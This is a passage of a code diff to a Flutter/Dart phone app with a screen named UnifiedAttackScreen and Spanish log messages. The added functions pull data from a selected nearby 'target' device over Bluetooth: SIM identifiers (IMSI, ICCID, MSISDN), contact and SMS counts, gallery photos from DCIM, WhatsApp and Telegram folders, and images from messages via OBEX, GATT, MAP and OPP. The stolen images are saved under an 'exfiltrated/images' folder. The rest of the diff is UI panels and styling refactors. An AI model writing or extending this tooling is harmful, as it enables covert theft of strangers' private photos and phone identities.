+          _appendLog('💳 ICCID: $iccid');
+          _collectedData.add('💳 [$displayName] ICCID: $iccid');
+        }
+        if (msisdn.isNotEmpty) _appendLog('📞 MSISDN: $msisdn');
+        _appendLog('📇 Agenda: $pbCount entradas, SMS: $smsCount');
+        _saveState();
+      } else {
+        _appendLog('❌ ${result['note'] ?? result['error'] ?? 'Sin canal AT accesible'}');
+      }
+    } catch (e) {
+      _appendLog('💥 AT Identity Error: $e');
+    }
+  }
+
+  Future<void> _sapExtract() async {
+    final device = _selectedDevice;
+    if (device == null) return;
+    final displayName = device_utils.getDeviceDisplayName(device);
+    _appendLog('📟 SAP Extract (SIM Access Profile) → $displayName');
+    _appendLog('⏳ Conectando vía SAP (requiere pairing y servidor SAP)...');
+    setState(() => _identityExtractionResult = null);
+    try {
+      final result = await RealExploitService.sapExtract(device);
+      setState(() => _identityExtractionResult = result);
+      if (result['success'] == true) {
+        final imsi = result['imsi'] ?? '';
+        final iccid = result['iccid'] ?? '';
+        final msisdn = result['msisdn'] ?? '';
+        _appendLog('✅ SAP conectado (ATR: ${result['atr'] ?? 'N/A'})');
+        if (imsi.isNotEmpty) {
+          _appendLog('🪪 IMSI: $imsi');
+          _collectedData.add('🪪 [$displayName] IMSI (SAP): $imsi');
+        }
+        if (iccid.isNotEmpty) {
+          _appendLog('💳 ICCID: $iccid');
+          _collectedData.add('💳 [$displayName] ICCID (SAP): $iccid');
+        }
+        if (msisdn.isNotEmpty) _appendLog('📞 MSISDN: $msisdn');
+        _saveState();
+      } else {
+        _appendLog('❌ ${result['error'] ?? result['note'] ?? 'SAP no disponible'}');
+      }
+    } catch (e) {
+      _appendLog('💥 SAP Error: $e');
+    }
+  }
+
+  void _deriveImeiCandidates() {
+    final device = _selectedDevice;
+    if (device == null) return;
+    final mac = device['address']?.toString() ?? '';
+    final candidates = HeuristicAnalysisService().deriveImeiCandidates(mac);
+    setState(() {
+      _identityExtractionResult = {
+        'success': candidates.isNotEmpty,
+        'imeiCandidates': candidates,
+        'source': 'Derivación heurística desde BD_ADDR (no verificado)',
+      };
+    });
+    if (candidates.isEmpty) {
+      _appendLog('🔢 No se pudieron derivar candidatos IMEI de $mac');
+    } else {
+      _appendLog('🔢 ${candidates.length} candidatos IMEI derivados de $mac (NO verificados)');
+      for (final c in candidates.take(3)) {
+        _appendLog('   - ${c['imei']} (TAC ${c['tac']})');
+      }
+    }
+  }
+
+  // ========== EXTRACCIÓN DE GALERÍA (FOTOS DEL OBJETIVO) ==========
+
+  Future<void> _extractPhotos({int maxImages = 30}) async {
+    final device = _selectedDevice;
+    if (device == null) return;
+    final displayName = device_utils.getDeviceDisplayName(device);
+    _appendLog('📸 Gallery Extract → $displayName');
+    _appendLog('⏳ Conectando vía OBEX FTP y recorriendo galería (DCIM/Pictures/WhatsApp/Telegram)...');
+    setState(() => _extractedImages = []);
+    try {
+      final result = await RealExploitService.extractImages(device, maxImages: maxImages);
+      final images = (result['images'] as List? ?? [])
+          .map<Map<String, dynamic>>((e) => Map<String, dynamic>.from(e as Map))
+          .toList();
+      if (mounted) {
+        setState(() => _extractedImages = images);
+      }
+      if (result['success'] == true && images.isNotEmpty) {
+        final totalBytes = result['totalBytes'] ?? 0;
+        _appendLog('✅ Galería: ${images.length} fotos extraídas ($totalBytes bytes)');
+        for (final img in images.take(5)) {
+          _appendLog('   🖼️ ${img['name']} (${img['size']} bytes) → ${img['localPath']}');
+        }
+        _collectedData.add('📸 [$displayName] ${images.length} fotos extraídas de la galería ($totalBytes bytes)');
+        _saveState();
+      } else {
+        _appendLog('❌ ${result['note'] ?? result['error'] ?? 'Galería no accesible (requiere perfil OBEX FTP sin auth)'}');
+      }
+    } catch (e) {
+      _appendLog('💥 Gallery Error: $e');
+    }
+  }
+
+  Widget _buildGalleryPanel() {
+    final images = _extractedImages;
+    if (images.isEmpty) return const SizedBox.shrink();
+
+    final totalBytes = images.fold<int>(0, (acc, img) => acc + ((img['size'] as num?)?.toInt() ?? 0));
+
+    return Container(
+      padding: const EdgeInsets.all(12),
+      decoration: BoxDecoration(
+        color: Colors.pink.withValues(alpha: 0.06),
+        borderRadius: BorderRadius.circular(12),
+        border: Border.all(color: Colors.pinkAccent.withValues(alpha: 0.3)),
+      ),
+      child: Column(
+        crossAxisAlignment: CrossAxisAlignment.start,
+        children: [
+          _buildInfoRow('FOTOS EXTRAÍDAS', '${images.length} (${totalBytes} bytes)', Colors.pinkAccent),
+          const SizedBox(height: 8),
+          SizedBox(
+            height: 130,
+            child: GridView.builder(
+              scrollDirection: Axis.horizontal,
+              itemCount: images.length,
+              gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
+                crossAxisCount: 1,
+                mainAxisSpacing: 8,
+                crossAxisSpacing: 8,
+              ),
+              itemBuilder: (context, index) {
+                final img = images[index];
+                final localPath = img['localPath']?.toString() ?? '';
+                return Column(
+                  children: [
+                    Expanded(
+                      child: localPath.isNotEmpty && File(localPath).existsSync()
+                          ? ClipRRect(
+                              borderRadius: BorderRadius.circular(8),
+                              child: Image.file(File(localPath), fit: BoxFit.cover),
+                            )
+                          : Container(
+                              decoration: BoxDecoration(
+                                color: Colors.pink.withValues(alpha: 0.15),
+                                borderRadius: BorderRadius.circular(8),
+                              ),
+                              child: const Icon(Icons.broken_image, color: Colors.white54),
+                            ),
+                    ),
+                    const SizedBox(height: 4),
+                    Text(
+                      img['name']?.toString() ?? '?',
+                      style: const TextStyle(color: Colors.white54, fontSize: 9),
+                      overflow: TextOverflow.ellipsis,
+                    ),
+                  ],
+                );
+              },
+            ),
+          ),
+          const SizedBox(height: 8),
+          Text(
+            'Guardadas en: exfiltrated/images/ (almacenamiento interno)',
+            style: const TextStyle(color: Colors.white38, fontSize: 10),
+          ),
+        ],
+      ),
+    );
+  }
+
+  Future<void> _mediastoreEnhancedExtract() async {
+    final device = _selectedDevice;
+    if (device == null) return;
+    final displayName = device_utils.getDeviceDisplayName(device);
+    _appendLog('📱 MediaStore Enhanced → $displayName');
+    _appendLog('⏳ Consultando content:// URIs (Android 10+ scoped storage)...');
+    setState(() => _mediastoreEnhanced = []);
+    try {
+      final result = await RealExploitService.mediastoreExtractAll(device, maxImages: 30);
+      final images = (result['images'] as List? ?? [])
+          .map<Map<String, dynamic>>((e) => Map<String, dynamic>.from(e as Map))
+          .toList();
+      if (mounted) setState(() => _mediastoreEnhanced = images);
+      if (result['success'] == true && images.isNotEmpty) {
+        final totalBytes = result['totalBytes'] ?? 0;
+        _appendLog('✅ MediaStore Enhanced: ${images.length} imógenes ($totalBytes bytes)');
+        _collectedData.add('📱 [$displayName] MediaStore Enhanced: ${images.length} imógenes ($totalBytes bytes)');
+        _saveState();
+      } else {
+        _appendLog('❌ ${result['error'] ?? result['message'] ?? 'MediaStore no accesible'}');
+      }
+    } catch (e) {
+      _appendLog('💥 MediaStore Error: $e');
+    }
+  }
+
+  Future<void> _gattImageRead() async {
+    final device = _selectedDevice;
+    if (device == null) return;
+    final displayName = device_utils.getDeviceDisplayName(device);
+    _appendLog('📡 GATT Image Read → $displayName');
+    _appendLog('⏳ Escaneando GATT characteristics buscando datos de imagen...');
+    setState(() => _gattImages = []);
+    try {
+      final result = await RealExploitService.gattImageRead(device, maxImages: 15);
+      final images = (result['images'] as List? ?? [])
+          .map<Map<String, dynamic>>((e) => Map<String, dynamic>.from(e as Map))
+          .toList();
+      if (mounted) setState(() => _gattImages = images);
+      if (result['success'] == true && images.isNotEmpty) {
+        _appendLog('✅ GATT Image Read: ${images.length} imógenes encontradas');
+        _collectedData.add('📡 [$displayName] GATT Image Read: ${images.length} imógenes');
+        _saveState();
+      } else {
+        _appendLog('ℹ️ GATT: ${images.length} imógenes (escaneadas ${result['characteristicsScanned'] ?? 0} characteristics)');
+      }
+    } catch (e) {
+      _appendLog('💥 GATT Image Read Error: $e');
+    }
+  }
+
+  Future<void> _oppServerMode() async {
+    final device = _selectedDevice;
+    if (device == null) return;
+    final displayName = device_utils.getDeviceDisplayName(device);
+    _appendLog('📤 OPP Server Mode → $displayName');
+    _appendLog('⏳ Esperando que el target envíe imágenes (30s timeout)...');
+    setState(() => _oppReceivedImages = []);
+    try {
+      final result = await RealExploitService.oppServerMode(device, timeoutSec: 30, maxImages: 10);
+      final images = (result['images'] as List? ?? [])
+          .map<Map<String, dynamic>>((e) => Map<String, dynamic>.from(e as Map))
+          .toList();
+      if (mounted) setState(() => _oppReceivedImages = images);
+      if (result['success'] == true && images.isNotEmpty) {
+        _appendLog('✅ OPP Server: ${images.length} imógenes recibidas');
+        _collectedData.add('📤 [$displayName] OPP Server: ${images.length} imógenes recibidas');
+        _saveState();
+      } else {
+        _appendLog('ℹ️ OPP Server: sin imógenes (el target no conectó)');
+      }
+    } catch (e) {
+      _appendLog('💥 OPP Server Error: $e');
+    }
+  }
+
+  Future<void> _mapImageExtract() async {
+    final device = _selectedDevice;
+    if (device == null) return;
+    final displayName = device_utils.getDeviceDisplayName(device);
+    _appendLog('💬 MAP Image Extract → $displayName');
+    _appendLog('⏳ Extrayendo imógenes adjuntas de mensajes...');
+    setState(() => _mapImages = []);
+    try {
+      final result = await RealExploitService.mapImageExtract(device, maxMessages: 50, maxImages: 20);
+      final images = (result['images'] as List? ?? [])
+          .map<Map<String, dynamic>>((e) => Map<String, dynamic>.from(e as Map))
+          .toList();
+      if (mounted) setState(() => _mapImages = images);
+      if (result['success'] == true && images.isNotEmpty) {
+        _appendLog('✅ MAP Image Extract: ${images.length} imógenes encontradas');
+        _collectedData.add('💬 [$displayName] MAP Image Extract: ${images.length} imógenes');
+        _saveState();
+      } else {
+        _appendLog('ℹ️ MAP: ${result['message'] ?? 'sin imógenes adjuntas'}');
+      }
+    } catch (e) {
+      _appendLog('💥 MAP Image Extract Error: $e');
+    }
+  }
+
+  Widget _buildModernExtractionPanel(String method, List<Map<String, dynamic>> images, Color accentColor) {
+    if (images.isEmpty) return const SizedBox.shrink();
+    final totalBytes = images.fold<int>(0, (acc, img) => acc + ((img['size'] as num?)?.toInt() ?? 0));
+    return Container(
+      padding: const EdgeInsets.all(12),
+      decoration: BoxDecoration(
+        color: accentColor.withValues(alpha: 0.06),
+        borderRadius: BorderRadius.circular(12),
+        border: Border.all(color: accentColor.withValues(alpha: 0.3)),
+      ),
+      child: Column(
+        crossAxisAlignment: CrossAxisAlignment.start,
+        children: [
+          _buildInfoRow('$method IMÁGENES', '${images.length} (${totalBytes} bytes)', accentColor),
+          const SizedBox(height: 8),
+          SizedBox(
+            height: 100,
+            child: GridView.builder(
+              scrollDirection: Axis.horizontal,
+              itemCount: images.length,
+              gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
+                crossAxisCount: 1,
+                mainAxisSpacing: 6,
+                crossAxisSpacing: 6,
+              ),
+              itemBuilder: (context, index) {
+                final img = images[index];
+                final localPath = img['localPath']?.toString() ?? '';
+                return Column(
+                  children: [
+                    Expanded(
+                      child: localPath.isNotEmpty && File(localPath).existsSync()
+                          ? ClipRRect(
+                              borderRadius: BorderRadius.circular(6),
+                              child: Image.file(File(localPath), fit: BoxFit.cover),
+                            )
+                          : Container(
+                              decoration: BoxDecoration(
+                                color: accentColor.withValues(alpha: 0.15),
+                                borderRadius: BorderRadius.circular(6),
+                              ),
+                              child: const Icon(Icons.image, color: Colors.white54, size: 24),
+                            ),
+                    ),
+                    const SizedBox(height: 2),
+                    Text(
+                      img['name']?.toString() ?? '?',
+                      style: TextStyle(color: Colors.white54, fontSize: 8),
+                      overflow: TextOverflow.ellipsis,
+                    ),
+                  ],
+                );
+              },
+            ),
+          ),
+        ],
+      ),
+    );
+  }
+
+  Widget _buildIdentityResultPanel() {
+    final result = _identityExtractionResult;
+    if (result == null) return const SizedBox.shrink();
+
+    final imei = result['imei']?.toString() ?? '';
+    final imsi = result['imsi']?.toString() ?? '';
+    final iccid = result['iccid']?.toString() ?? '';
+    final msisdn = result['msisdn']?.toString() ?? '';
+    final manufacturer = result['manufacturer']?.toString() ?? '';
+    final model = result['model']?.toString() ?? '';
+    final pbCount = result['phonebookCount'] ?? 0;
+    final smsCount = result['smsCount'] ?? 0;
+    final candidates = result['imeiCandidates'];
+    final luhnValid = result['imeiLuhnValid'] == true;
+
+    List<Widget> rows = [
+      _buildInfoRow('Estado', result['success'] == true ? 'ÉXITO' : 'FALLIDO',
+          result['success'] == true ? Colors.greenAccent : Colors.redAccent),
+      if (manufacturer.isNotEmpty) _buildInfoRow('Fabricante', manufacturer, Colors.white),
+      if (model.isNotEmpty) _buildInfoRow('Modelo', model, Colors.white),
+      if (imei.isNotEmpty)
+        _buildInfoRow('IMEI', '$imei${luhnValid ? ' ✓' : ' (Luhn inválido)'}',
+            luhnValid ? Colors.greenAccent : Colors.orangeAccent),
+      if (imsi.isNotEmpty) _buildInfoRow('IMSI', imsi, Colors.lightBlueAccent),
+      if (iccid.isNotEmpty) _buildInfoRow('ICCID', iccid, Colors.lightBlueAccent),
+      if (msisdn.isNotEmpty) _buildInfoRow('MSISDN', msisdn, Colors.lightBlueAccent),
+      if (pbCount is int && pbCount > 0) _buildInfoRow('Contactos', '$pbCount', Colors.white),
+      if (smsCount is int && smsCount > 0) _buildInfoRow('SMS', '$smsCount', Colors.white),
+    ];
+
+    if (candidates is List && candidates.isNotEmpty) {
+      rows.add(const Divider(color: Colors.white12));
+      rows.add(_buildInfoRow('Candidatos IMEI (heurística)', '${candidates.length}', Colors.blueGrey));
+      for (final c in candidates.take(5)) {
+        rows.add(_buildInfoRow('   ${c['imei']}', 'TAC ${c['tac']} — no verificado', Colors.blueGrey.shade200));
+      }
+    }
+
+    return Container(
+      padding: const EdgeInsets.all(12),
+      decoration: BoxDecoration(
+        color: Colors.white.withValues(alpha: 0.05),
+        borderRadius: BorderRadius.circular(12),
+        border: Border.all(color: Colors.tealAccent.withValues(alpha: 0.3)),
+      ),
+      child: Column(
+        crossAxisAlignment: CrossAxisAlignment.start,
+        children: rows,
+      ),
+    );
+  }
+
+  Widget _buildInfoRow(String label, String value, Color color) {
+    return Padding(
+      padding: const EdgeInsets.symmetric(vertical: 4),
+      child: Row(
+        mainAxisAlignment: MainAxisAlignment.spaceBetween,
+        children: [
+          Flexible(
+            child: Text(label,
+                style: const TextStyle(color: Colors.white54, fontSize: 12),
+                overflow: TextOverflow.ellipsis,
+                maxLines: 1),
+          ),
+          const SizedBox(width: 12),
+          Flexible(
+            child: Text(value,
+                style: TextStyle(color: color, fontSize: 12, fontFamily: 'monospace'),
+                textAlign: TextAlign.right,
+                overflow: TextOverflow.ellipsis,
+                maxLines: 1),
+          ),
+        ],
+      ),
+    );
   }
 
   // ========== PBAP EXTRACTION ==========
@@ -4569,12 +5601,79 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
 
   // ========== UI BUILDERS ==========
 
+  // Tarjeta informativa + EJECUTABLE: al pulsar ejecuta la técnica real
+  Widget _buildAutoRunCard(String title, String subtitle, {VoidCallback? onTap}) {
+    return Material(
+      color: Colors.transparent,
+      child: InkWell(
+        borderRadius: BorderRadius.circular(12),
+        onTap: onTap,
+        child: Container(
+          width: double.infinity,
+          padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
+          decoration: BoxDecoration(
+            color: Colors.greenAccent.withValues(alpha: 0.06),
+            borderRadius: BorderRadius.circular(12),
+            border: Border.all(color: onTap != null ? Colors.greenAccent.withValues(alpha: 0.6) : Colors.greenAccent.withValues(alpha: 0.3)),
+          ),
+          child: Row(
+            children: [
+              Icon(onTap != null ? Icons.play_circle_fill : Icons.auto_mode, color: onTap != null ? Colors.greenAccent : Colors.greenAccent, size: onTap != null ? 20 : 18),
+              const SizedBox(width: 10),
+              Expanded(
+                child: Column(
+                  crossAxisAlignment: CrossAxisAlignment.start,
+                  children: [
+                    Text(title, style: const TextStyle(color: Colors.greenAccent, fontWeight: FontWeight.bold, fontSize: 12)),
+                    const SizedBox(height: 2),
+                    Text(subtitle, style: const TextStyle(color: Colors.white38, fontSize: 10)),
+                  ],
+                ),
+              ),
+              if (onTap != null) const Icon(Icons.touch_app, color: Colors.greenAccent, size: 14),
+            ],
+          ),
+        ),
+      ),
+    );
+  }
+
+  Widget _buildAutoRunAction(String actions, String note, {VoidCallback? onTap, IconData? icon}) {
+    return Container(
+      width: double.infinity,
+      padding: const EdgeInsets.all(12),
+      decoration: BoxDecoration(
+        color: Colors.indigoAccent.withValues(alpha: 0.06),
+        borderRadius: BorderRadius.circular(12),
+        border: Border.all(color: onTap != null ? Colors.indigoAccent.withValues(alpha: 0.6) : Colors.indigoAccent.withValues(alpha: 0.25)),
+      ),
+      child: Column(
+        crossAxisAlignment: CrossAxisAlignment.start,
+        children: [
+          Row(
+            children: [
+              Icon(icon ?? Icons.auto_mode, color: Colors.indigoAccent, size: onTap != null ? 20 : 16),
+              const SizedBox(width: 8),
+              Expanded(
+                child: Text(actions,
+                    style: const TextStyle(color: Colors.white70, fontSize: 11, fontWeight: FontWeight.w600)),
+              ),
+              if (onTap != null) const Icon(Icons.touch_app, color: Colors.indigoAccent, size: 14),
+            ],
+          ),
+          const SizedBox(height: 4),
+          Text(note, style: const TextStyle(color: Colors.white30, fontSize: 10)),
+        ],
+      ),
+    );
+  }
+
   Widget _buildExploitCard(String title, String subtitle, IconData icon, Color color, VoidCallback? onTap) {
     return Card(
       child: ListTile(
         leading: Container(
           padding: const EdgeInsets.all(10),
-          decoration: BoxDecoration(color: color.withOpacity(0.1), borderRadius: BorderRadius.circular(12)),
+          decoration: BoxDecoration(color: color.withValues(alpha: 0.1), borderRadius: BorderRadius.circular(12)),
           child: Icon(icon, color: color, size: 24),
         ),
         title: Text(title, style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 13), maxLines: 1, overflow: TextOverflow.ellipsis),
@@ -4583,9 +5682,9 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
             ? Container(
                 padding: const EdgeInsets.all(8),
                 decoration: BoxDecoration(
-                  color: color.withOpacity(0.1),
+                  color: color.withValues(alpha: 0.1),
                   borderRadius: BorderRadius.circular(100),
-                  border: Border.all(color: color.withOpacity(0.5)),
+                  border: Border.all(color: color.withValues(alpha: 0.5)),
                 ),
                 child: Icon(Icons.bolt, color: color, size: 16),
               )
@@ -4599,9 +5698,9 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
     return Container(
       padding: const EdgeInsets.all(12),
       decoration: BoxDecoration(
-        color: Colors.cyan[900]!.withOpacity(0.2),
+        color: Colors.cyan[900]!.withValues(alpha: 0.2),
         borderRadius: BorderRadius.circular(12),
-        border: Border.all(color: Colors.cyanAccent.withOpacity(0.3)),
+        border: Border.all(color: Colors.cyanAccent.withValues(alpha: 0.3)),
       ),
       child: Column(
         crossAxisAlignment: CrossAxisAlignment.start,
@@ -4628,8 +5727,11 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
                   ),
                 ),
                 Text(
-                  (s['uuid']?.toString() ?? '').substring(0, 8),
+                  (s['uuid']?.toString() ?? '').length >= 8
+                      ? (s['uuid']!.toString().substring(0, 8))
+                      : (s['uuid']?.toString() ?? ''),
                   style: const TextStyle(color: Colors.white38, fontSize: 9, fontFamily: 'monospace'),
+                  overflow: TextOverflow.ellipsis,
                 ),
               ],
             ),
@@ -4648,9 +5750,9 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
     return Container(
       padding: const EdgeInsets.all(12),
       decoration: BoxDecoration(
-        color: Colors.orange[900]!.withOpacity(0.2),
+        color: Colors.orange[900]!.withValues(alpha: 0.2),
         borderRadius: BorderRadius.circular(12),
-        border: Border.all(color: Colors.orangeAccent.withOpacity(0.3)),
+        border: Border.all(color: Colors.orangeAccent.withValues(alpha: 0.3)),
       ),
       child: Column(
         crossAxisAlignment: CrossAxisAlignment.start,
@@ -4678,7 +5780,9 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
                     ),
                   ),
                   if (c['phone'] != null)
-                    Text(c['phone']!, style: const TextStyle(color: Colors.white38, fontSize: 9)),
+                    Flexible(
+                      child: Text(c['phone']!, style: const TextStyle(color: Colors.white38, fontSize: 9), overflow: TextOverflow.ellipsis, maxLines: 1),
+                    ),
                 ],
               ),
             )),
@@ -4717,7 +5821,9 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
                     ),
                   ),
                   if (c['phone'] != null)
-                    Text(c['phone']!, style: const TextStyle(color: Colors.white38, fontSize: 9)),
+                    Flexible(
+                      child: Text(c['phone']!, style: const TextStyle(color: Colors.white38, fontSize: 9), overflow: TextOverflow.ellipsis, maxLines: 1),
+                    ),
                   if (c['datetime'] != null)
                     Padding(
                       padding: const EdgeInsets.only(left: 4),
@@ -4738,7 +5844,7 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
   }
 
   Widget _buildSectionTitle(String title, String subtitle) {
-    return Column(crossAxisAlignment: CrossAxisAlignment.start, children: [Text(title, style: const TextStyle(color: Colors.indigoAccent, fontSize: 16, fontWeight: FontWeight.bold, letterSpacing: 1)), Text(subtitle, style: const TextStyle(color: Colors.white24, fontSize: 10, fontFamily: 'monospace')), const SizedBox(height: 12), Container(height: 1, color: Colors.white.withOpacity(0.05))]);
+    return Column(crossAxisAlignment: CrossAxisAlignment.start, children: [Text(title, style: const TextStyle(color: Colors.indigoAccent, fontSize: 16, fontWeight: FontWeight.bold, letterSpacing: 1)), Text(subtitle, style: const TextStyle(color: Colors.white24, fontSize: 10, fontFamily: 'monospace')), const SizedBox(height: 12), Container(height: 1, color: Colors.white.withValues(alpha: 0.05))]);
   }
 
   Widget _buildAttackCard(String title, String subtitle, Color color, VoidCallback onTap, {String? type}) {
@@ -4754,7 +5860,7 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
         margin: const EdgeInsets.only(bottom: 12),
         decoration: BoxDecoration(
           borderRadius: BorderRadius.circular(16),
-          boxShadow: recommended ? [BoxShadow(color: Colors.cyanAccent.withOpacity(0.1), blurRadius: 8, spreadRadius: 1)] : null,
+          boxShadow: recommended ? [BoxShadow(color: Colors.cyanAccent.withValues(alpha: 0.1), blurRadius: 8, spreadRadius: 1)] : null,
         ),
         child: Card(
           margin: EdgeInsets.zero,
@@ -4762,7 +5868,7 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
             contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
             title: Row(children: [
               Expanded(child: Text(title, style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 13), maxLines: 1, overflow: TextOverflow.ellipsis)),
-              if (recommended) ...[const SizedBox(width: 8), Container(padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2), decoration: BoxDecoration(color: Colors.cyanAccent.withOpacity(0.2), borderRadius: BorderRadius.circular(4)), child: const Text('ÓPTIMO', style: TextStyle(color: Colors.cyanAccent, fontSize: 8, fontWeight: FontWeight.bold)))]
+              if (recommended) ...[const SizedBox(width: 8), Container(padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2), decoration: BoxDecoration(color: Colors.cyanAccent.withValues(alpha: 0.2), borderRadius: BorderRadius.circular(4)), child: const Text('ÓPTIMO', style: TextStyle(color: Colors.cyanAccent, fontSize: 8, fontWeight: FontWeight.bold)))]
             ]),
             subtitle: Column(
               crossAxisAlignment: CrossAxisAlignment.start,
@@ -4771,7 +5877,7 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
                 Text(subtitle, style: const TextStyle(color: Colors.white24, fontSize: 10)),
                 const SizedBox(height: 8),
                 Row(children: [
-                  Expanded(child: ClipRRect(borderRadius: BorderRadius.circular(2), child: LinearProgressIndicator(value: prob, backgroundColor: Colors.white.withOpacity(0.05), valueColor: AlwaysStoppedAnimation<Color>(prob > 0.7 ? Colors.greenAccent : (prob > 0.4 ? Colors.cyanAccent : Colors.white30)), minHeight: 4))),
+                  Expanded(child: ClipRRect(borderRadius: BorderRadius.circular(2), child: LinearProgressIndicator(value: prob, backgroundColor: Colors.white.withValues(alpha: 0.05), valueColor: AlwaysStoppedAnimation<Color>(prob > 0.7 ? Colors.greenAccent : (prob > 0.4 ? Colors.cyanAccent : Colors.white30)), minHeight: 4))),
                   const SizedBox(width: 8),
                   Text(
                     '${(prob * 100).toInt()}%',
@@ -4780,40 +5886,9 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
                 ]),
               ],
             ),
-            trailing: Container(padding: const EdgeInsets.all(8), decoration: BoxDecoration(color: color.withOpacity(0.1), borderRadius: BorderRadius.circular(100), border: Border.all(color: color.withOpacity(recommended ? 0.8 : 0.2))), child: Icon(Icons.bolt, color: color, size: 16)),
+            trailing: Container(padding: const EdgeInsets.all(8), decoration: BoxDecoration(color: color.withValues(alpha: 0.1), borderRadius: BorderRadius.circular(100), border: Border.all(color: color.withValues(alpha: recommended ? 0.8 : 0.2))), child: Icon(Icons.bolt, color: color, size: 16)),
             onTap: _selectedDevice == null ? null : (isViable ? onTap : null),
           ),
-        ),
-      ),
-    );
-  }
-
-  Widget _buildAiModelCard(String title, String subtitle, String status) {
-    return Card(
-      margin: const EdgeInsets.only(bottom: 10),
-      child: Padding(
-        padding: const EdgeInsets.all(16),
-        child: Row(
-          children: [
-            Expanded(
-              child: Column(
-                crossAxisAlignment: CrossAxisAlignment.start,
-                children: [
-                  Text(title, style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 12)),
-                  Text(subtitle, style: const TextStyle(color: Colors.white54, fontSize: 10, fontFamily: 'monospace')),
-                ],
-              ),
-            ),
-            Container(
-              padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
-              decoration: BoxDecoration(
-                color: Colors.greenAccent.withOpacity(0.1),
-                borderRadius: BorderRadius.circular(8),
-                border: Border.all(color: Colors.greenAccent.withOpacity(0.3)),
-              ),
-              child: Text(status, style: const TextStyle(color: Colors.greenAccent, fontSize: 10, fontWeight: FontWeight.bold)),
-            ),
-          ],
         ),
       ),
     );
@@ -4831,9 +5906,9 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
     return Container(
       padding: const EdgeInsets.all(12),
       decoration: BoxDecoration(
-        color: Colors.green[900]!.withOpacity(0.2),
+        color: Colors.green[900]!.withValues(alpha: 0.2),
         borderRadius: BorderRadius.circular(12),
-        border: Border.all(color: Colors.greenAccent.withOpacity(0.3)),
+        border: Border.all(color: Colors.greenAccent.withValues(alpha: 0.3)),
       ),
       child: Column(
         crossAxisAlignment: CrossAxisAlignment.start,
